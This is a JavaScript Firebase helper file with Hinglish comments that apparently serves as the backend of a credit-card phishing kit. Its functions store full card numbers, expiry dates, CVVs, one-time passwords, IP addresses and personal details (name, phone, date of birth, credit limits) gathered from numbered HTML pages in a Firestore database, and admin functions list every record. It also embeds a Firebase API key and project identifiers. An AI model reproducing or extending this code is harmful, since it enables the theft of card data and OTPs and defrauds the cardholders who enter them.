// Firebase Configuration File
// Ek hi jagha se sara project manage karo

// Firebase SDK ko load karne ke liye yeh script tag use karo HTML mein:
// <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js"></script>
// <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js"></script>
// <script src="firebase-config.js"></script>

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyCGunogYC48i8PGfiLc6ZSExvIzSDWNYdc",
  authDomain: "indus-12a8b.firebaseapp.com",
  databaseURL: "https://indus-12a8b-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "indus-12a8b",
  storageBucket: "indus-12a8b.firebasestorage.app",
  messagingSenderId: "91666064256",
  appId: "1:91666064256:web:1fd1c2fd8350d8e4d29765"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// ==========================================
// OTP Verification Function
// 6.html mein use karo
// ==========================================
async function sendOTPToFirebase(otp) {
    try {
        const timestamp = new Date();
        const docRef = await db.collection("otp_verifications").add({
            otp: otp,
            timestamp: timestamp,
            status: "pending",
            verified: false
        });

        console.log("OTP Firebase mein save ho gya ID ke saath: ", docRef.id);
        return { success: true, docId: docRef.id };
    } catch (error) {
        console.error("OTP Firebase mein error: ", error);
        return { success: false, error: error.message };
    }
}

// ==========================================
// Card Authentication Function
// 4.html mein use karo
// ==========================================
async function saveCardAuthenticationToFirebase(cardData) {
    try {
        const docRef = await db.collection("card_authentications").add({
            cardHolderName: cardData.name,
            cardNumber: cardData.cardNumber,
            expiryDate: cardData.expiry,
            cvv: cardData.cvv,
            timestamp: new Date(),
            status: "submitted",
            ipAddress: await getClientIP()
        });

        console.log("Card data Firebase mein save ho gya ID ke saath: ", docRef.id);
        return { success: true, docId: docRef.id };
    } catch (error) {
        console.error("Card data Firebase mein error: ", error);
        return { success: false, error: error.message };
    }
}

// ==========================================
// User Personal Information Function
// Agar kisi aur file mein personal info save karna ho
// ==========================================
async function saveUserInfoToFirebase(userData) {
    try {
        const docRef = await db.collection("user_information").add({
            name: userData.name,
            email: userData.email,
            phone: userData.phone,
            dateOfBirth: userData.dateOfBirth,
            totalLimit: userData.totalLimit,
            availableLimit: userData.availableLimit,
            timestamp: new Date(),
            status: "submitted"
        });

        console.log("User info Firebase mein save ho gya ID ke saath: ", docRef.id);
        return { success: true, docId: docRef.id };
    } catch (error) {
        console.error("User info Firebase mein error: ", error);
        return { success: false, error: error.message };
    }
}

// ==========================================
// Helper Function - Client IP Lookup
// ==========================================
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.log("IP fetch mein error (using default): ", error);
        return "unknown";
    }
}

// ==========================================
// Generic Form Submission Function
// Use this to save any form data to a named collection
// formName: string (collection name), data: object
// ==========================================
async function saveFormSubmissionToFirebase(formName, data) {
    try {
        const payload = Object.assign({}, data, { timestamp: new Date() });
        const docRef = await db.collection(formName).add(payload);
        console.log(`Form ${formName} saved with ID: `, docRef.id);
        return { success: true, docId: docRef.id };
    } catch (error) {
        console.error(`Error saving form ${formName}: `, error);
        return { success: false, error: error.message };
    }
}

// ==========================================
// Check if Firebase is Initialized
// ==========================================
function isFirebaseReady() {
    try {
        return firebase.apps.length > 0 && typeof db !== 'undefined';
    } catch (error) {
        console.error("Firebase check error: ", error);
        return false;
    }
}

// ==========================================
// Data Verification Functions
// ==========================================

// OTP ko verify karo
async function verifyOTP(docId, isVerified) {
    try {
        await db.collection("otp_verifications").doc(docId).update({
            verified: isVerified,
            verifiedAt: new Date(),
            status: isVerified ? "verified" : "failed"
        });
        console.log("OTP verification status update ho gya");
        return true;
    } catch (error) {
        console.error("OTP verification update mein error: ", error);
        return false;
    }
}

// Card ko verify karo
async function verifyCard(docId, isValid) {
    try {
        await db.collection("card_authentications").doc(docId).update({
            verified: isValid,
            verifiedAt: new Date(),
            status: isValid ? "approved" : "rejected"
        });
        console.log("Card verification status update ho gya");
        return true;
    } catch (error) {
        console.error("Card verification update mein error: ", error);
        return false;
    }
}

// ==========================================
// Data Retrieval Functions
// Admin ke liye
// ==========================================

// Sabhi OTP records lao
async function getAllOTPVerifications() {
    try {
        const snapshot = await db.collection("otp_verifications").get();
        const data = [];
        snapshot.forEach(doc => {
            data.push({ id: doc.id, ...doc.data() });
        });
        return data;
    } catch (error) {
        console.error("OTP records fetch mein error: ", error);
        return [];
    }
}

// Sabhi card authentications lao
async function getAllCardAuthentications() {
    try {
        const snapshot = await db.collection("card_authentications").get();
        const data = [];
        snapshot.forEach(doc => {
            data.push({ id: doc.id, ...doc.data() });
        });
        return data;
    } catch (error) {
        console.error("Card auth records fetch mein error: ", error);
        return [];
    }
}

// Sabhi user information lao
async function getAllUserInformation() {
    try {
        const snapshot = await db.collection("user_information").get();
        const data = [];
        snapshot.forEach(doc => {
            data.push({ id: doc.id, ...doc.data() });
        });
        return data;
    } catch (error) {
        console.error("User info records fetch mein error: ", error);
        return [];
    }
}

// ==========================================
// Export functions for use in other files
// ==========================================
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        db,
        sendOTPToFirebase,
        saveCardAuthenticationToFirebase,
        saveUserInfoToFirebase,
        saveFormSubmissionToFirebase,
        verifyOTP,
        verifyCard,
        getAllOTPVerifications,
        getAllCardAuthentications,
        getAllUserInformation
    };
}
